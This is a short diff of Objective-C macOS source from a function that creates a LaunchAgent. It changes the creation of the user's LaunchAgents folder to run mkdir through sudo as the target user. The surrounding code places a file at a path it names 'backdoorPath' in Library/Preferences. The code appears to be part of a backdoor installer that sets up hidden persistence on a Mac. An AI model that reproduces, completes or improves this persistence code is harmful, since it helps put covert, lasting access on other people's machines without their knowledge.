@@ -122,13 +122,25 @@ BOOL createLaunchAgent(NSString *username, NSString *dirName, NSString *aBinary)
 #ifdef DEBUG
       NSLog(@"LaunchAgents folder does not exist");
 #endif
-      if (mkdir([launchAgentsPath UTF8String], 0755) == -1)
-        {
-#ifdef DEBUG
-          NSLog(@"Error on LaunchAgents mkdir");
-#endif
-          return NO;
-        }
+
+      //
+      // Create LaunchAgents dir
+      //
+      NSArray *arguments = [NSArray arrayWithObjects:
+        @"-u",
+        username,
+        @"/bin/mkdir",
+        launchAgentsPath,
+        nil];
+
+      executeTask(@"/usr/bin/sudo", arguments, YES);
+      //if (mkdir([launchAgentsPath UTF8String], 0755) == -1)
+        //{
+//#ifdef DEBUG
+          //NSLog(@"Error on LaunchAgents mkdir");
+//#endif
+          //return NO;
+        //}
     }
   
   NSString *backdoorPath = [NSString stringWithFormat: @"%@/Library/Preferences/%@",
